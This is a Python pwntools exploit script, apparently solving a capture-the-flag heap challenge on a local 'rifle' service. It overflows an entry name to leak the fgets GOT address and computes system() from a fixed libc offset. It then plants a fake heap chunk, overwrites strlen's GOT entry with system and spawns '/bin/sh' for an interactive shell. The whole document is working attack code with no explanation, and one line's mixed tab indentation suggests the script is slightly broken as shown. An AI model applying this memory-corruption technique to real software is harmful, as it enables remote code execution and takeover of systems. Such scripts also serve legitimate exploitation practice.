from pwn import *

sh = remote("127.0.0.1", 4000)

def add_rifle(name, desc):
    sh.sendline("1")
    sh.sendline(name)
	sh.send(desc)

def order_rifles():
    sh.sendline("3")

def leave_message(msg):
    sh.sendline("4")
    sh.sendline(msg)

fgets_got = 0x804a23c
message_ptr = 0x0804a2a8
strlen_got = 0x0804a250

for x in xrange(0x63):
    add_rifle("hello", "world")

payload = ""
payload += "A"*27
payload += p32(fgets_got)
add_rifle(payload, "A"*0x25)

sh.sendline("2")
sh.recvuntil("===================================")
sh.recvuntil("===================================")
sh.recvuntil("Name: ")
sh.recvuntil("\nDescription: ")
leak_data = sh.recv(4)
fgets_addr = u32(leak_data)
system_addr = fgets_addr-0x25a23

payload = ""
payload += "A"*27
payload += p32(message_ptr)
add_rifle(payload, "A"*0x25)

payload = ""
payload += p32(0x00000000)*9
payload += p32(0x0000012c) # size
payload += p32(0xdeadbeef)
payload += p32(0x00000000)*10
leave_message(payload)
order_rifles()

add_rifle("name", p32(strlen_got))
leave_message(p32(system_addr)+";/bin/sh")

sh.interactive()